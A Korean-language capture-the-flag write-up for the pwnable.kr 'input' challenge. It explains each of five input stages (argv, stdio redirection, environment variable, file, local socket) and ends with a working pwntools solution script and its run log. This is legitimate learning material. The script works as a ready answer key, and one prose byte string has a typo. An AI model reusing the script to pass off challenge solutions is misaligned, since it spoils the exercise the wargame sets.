# [WriteUp]pwnable.kr - input

:black_nib:ChyKor12(sjjo0225@gmail.com)

---

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
    if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    	return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");	
	return 0;
}
```

5개의 스테이지를 통과하면 플래그를 준다. 각 스테이지마다 특정 조건을 만족시키면 프로그램을 종료시키기 때문에, 모든 조건을 우회해야 플래그를 얻을 수 있다. 하나씩 차례대로 살펴보도록 하자.

---

```c
	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");
```

`main()`의 매개변수를 이용한 스테이지다.

`argc`는 매개변수의 총 개수를 의미한다. 프로그램을 실행할 때, 예를 들어 `./input AAAA BBBB CCCC` 이런 식으로 인자를 주게 되면 `argc`는 4가 된다. `argc`가 100이어야 조건을 통과한다.

`argv['A']`는 `argv[0x41]`을 뜻한다. 이 값이 `"\x00"`이어야 한다. 마찬가지로, `argv['B']`는 `argv[0x42]`를 뜻한다. 이 값이 `"\x20\x0a\x0d"`이어야 한다.

이렇게 하면 첫 번째 스테이지를 통과할 수 있다.

---

```c
	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
    if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
```

두 번째 스테이지는 표준 입출력과 관련된 스테이지이다. 0은 stdin을 뜻하기 때문에 `read(0, buf, 4);`는 표준 입력으로 4바이트를 받는 것이고, 이 4바이트가 `"\x00\x0a\x00\xff"`이면 조건을 통과한다.

2는 원래는 stderr(표준 에러)를 뜻하는데, stderr은 출력 스트림이기 때문에 `read()`로 입력을 받으려면 redirection을 해 주어야 한다. 파일 디스크립터 2가 stderr이 아닌 다른 파일을 가리키도록 만드는 것이다. 그 파일에 `"\x00\x0a\x02\xff"`가 적혀 있으면 조건을 통과할 수 있다.

---

```c
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");
```

세 번째 스테이지는 환경 변수와 관련된 스테이지이다. `getenv()`는 환경 변수 리스트에서 인자로 주어진 문자열을 검색한다. 예를 들어 `getenv("PATH");`를 호출하면 환경 변수 `PATH`로 등록된 문자열을 반환한다. 검색했는데 결과가 없으면 NULL을 반환한다. `"\xde\xad\xbd\xef"`라는 이름의 환경 변수에 `"\xca\xfe\xba\xbe"`를 등록해 놓으면 조건을 통과할 수 있다.

---

```c
	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	
```

네 번째 스테이지는 파일 입출력과 관련된 스테이지이다. `"\x0a"`라는 이름을 가진 파일의 첫 4바이트가 `"\x00\x00\x00\x00"`이면 조건을 통과할 수 있다.

---

```c
	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    	return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");
```

다섯 번째 스테이지는 네트워크와 관련된 스테이지이다.

먼저 소켓 프로그래밍과 관련한 이해가 필요하다. 우선 `struct sockaddr_in`은 간단하게 말하면 소켓의 통신 대상을 지정하기 위한 구조체의 형태 중 하나이다. 기본형은 `struct sockaddr`이고, 특정한 경우에 `sockaddr_in`이나 `sockaddr_in6`라는 변형된 구조체를 사용한다.

```c
struct sockaddr {
    unsigned short sa_family; // address family, 2 bytes
    char sa_data[14]; // IP address + Port number, 14 bytes
};
```

`sockaddr`는 주소 체계를 나타내는 `sa_family`와 IP 주소, 포트 번호를 담는 `sa_data`로 이루어진다. `sa_family`가 AF_INET이면 `sockaddr_in`을 사용하고, AF_INET6이면 `sockaddr_in6`를 사용한다.

```c
struct sockaddr_in {
    short sin_family; // AF_INET
    unsigned short sin_port; // 16 bit Port number, network byte order
    struct in_addr sin_addr; // 32 bit IP address
    char sin_zero[8]; // dummy
};

struct in_addr {
    unsigned long s_addr; // 32 bit IP address, network byte order
};
```

network byte order는, 네트워크에서는 2바이트 이상의 데이터를 빅 엔디안 방식으로 처리하는데 그 방식을 따른다는 의미이다. `htons()`라는 함수가 인자로 받은 수를 network byte order로 변환하는 역할을 한다. h는 Host, ton은 TO Network, s는 Short를 의미한다. 인자로 short 크기(2바이트)의 정수를 받기 때문이다. `saddr.sin_port = htons(atoi(argv['C']));`라는 코드가 있기 때문에 `argv[0x43]`에는 올바른 포트 번호가 들어가 있어야 할 것이다.

`socket()`은 함수명 그대로 소켓을 만드는 함수이다. 세 개의 인자를 가지는데 앞에서부터 차례로 domain, type, protocol이다. domain은 인터넷을 통해 통신할지, 같은 시스템 내에서 프로세스끼리 통신할지를 결정한다. type은 데이터의 전송 형태를 지정한다. TCP/IP 프로토콜을 이용하면 type은 `SOCK_STREAM`이 되고 UDP/IP 프로토콜을 이용하면 type은 `SOCK_DGRAM`이 된다. protocol은 통신에 있어서 특정 프로토콜 사용을 지정하기 위한 변수이며, 보통 0을 사용한다. 즉 `sd = socket(AF_INET, SOCK_STREAM, 0);`라는 코드가 의미하는 바는 IPv4, TCP/IP 프로토콜을 이용하는 소켓의 디스크립터를 `sd`에 대입하겠다는 것이다. 반환값이 -1이면 소켓 생성에 실패한 것이다.

`saddr.sin_addr.s_addr = INADDR_ANY;`에서 `INADDR_ANY`는 서버의 IP주소를 자동으로 찾아서 대입해 주는 함수 비슷한 것이다. 헤더 파일에 `#define`문으로 정의되어 있다.

`bind()`는 소켓의 IP 주소와 포트 번호를 지정해 줌으로써 통신에 사용할 수 있도록 준비시킨다. 세 개의 인자를 가지는데, 앞에서부터 차례대로 소켓 디스크립터, `sockaddr` 구조체의 주소, 구조체의 크기이다.

`listen()`은 소켓이 클라이언트의 접속 요청을 기다리도록 설정한다. 두 개의 인자를 가지는데 앞에서부터 차례대로 소켓 디스크립터와 대기 큐의 개수이다. `accept()`는 클라이언트의 접속 요청을 받아들이고, 클라이언트와 통신하기 위한 전용 소켓을 생성한다. `cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);`에서는 클라이언트의 정보를 `caddr`에 저장하고 새로운 소켓 디스크립터를 `cd`에 대입한다.

`recv()`는 소켓으로부터 자료를 수신한다. 4개의 인자를 가지는데, 앞에서부터 차례대로 소켓 디스크립터, 자료를 수신할 버퍼의 주소, 버퍼의 크기, 플래그이다. `MSG_DONTWAIT` 플래그는 수신을 위해 대기가 필요할 때 기다리지 않고 -1을 바로 반환하도록 하는 것이고, `MSG_NOSIGNAL` 플래그는 상대방과 연결이 끊겼을 때 SIGPIPE 시그널이 발생하지 않도록 하는 것이다. `if( recv(cd, buf, 4, 0) != 4 ) return 0;`에서는 `cd`로부터 4바이트를 받아서 `buf`에 저장하도록 하는데, 수신한 자료가 4바이트가 아니면 프로그램을 종료한다. 그리고 `if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;`에서는 수신한 자료가 `"\xde\xad\xbe\xef"`가 아니면 프로그램을 종료한다. 즉 우리가 해야 할 것은 올바른 포트 번호를 입력해서 `"\xde\xad\xbe\xef"`를 수신할 수 있도록 만드는 것이다.

---

최종 익스플로잇은 다음과 같다.

```python
# exploit_input.py

from pwn import *

argvs = ["AAAA" for i in range(100)]

# stage 1
argvs[0x41] = "\x00"
argvs[0x42] = "\x20\x0a\x0d"

# stage 2
with open("./stderr", "w") as fd:
    fd.write("\x00\x0a\x02\xff")

# stage 3
envv = {"\xde\xad\xbe\xef":"\xca\xfe\xba\xbe"}

# stage 4
with open("\x0a", "w") as fd:
    fd.write("\x00\x00\x00\x00")

# stage 5
argvs[0x43] = "50000"

p = process(executable = "/home/input2/input", argv = argvs, stderr = open("./stderr"), env = envv)

# stage 2
p.send("\x00\x0a\x00\xff")

# stage 5
s = remote("localhost", 50000)
s.send("\xde\xad\xbe\xef")

p.interactive()
```

```bash
input2@prowl:/tmp$ mkdir ChyKor12
input2@prowl:/tmp$ cd ChyKor12
input2@prowl:/tmp/ChyKor12$ vi exploit_input.py
input2@prowl:/tmp/ChyKor12$ ln -s ~/flag flag
input2@prowl:/tmp/ChyKor12$ ls -al
total 244
drwxrwxr-x    2 input2 input2   4096 Jan  8 01:07 .
drwxrwx-wt 6315 root   root   237568 Jan  8 01:07 ..
-rw-rw-r--    1 input2 input2    570 Jan  8 01:07 exploit_input.py
lrwxrwxrwx    1 input2 input2     17 Jan  8 01:07 flag -> /home/input2/flag
input2@prowl:/tmp/ChyKor12$ python exploit_input.py
[+] Starting local process '/home/input2/input': pid 25377
[+] Opening connection to localhost on port 50000: Done
[*] Switching to interactive mode
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
Stage 5 clear!
Mommy! I learned how to pass various input in Linux :)
[*] Got EOF while reading in interactive
$
```

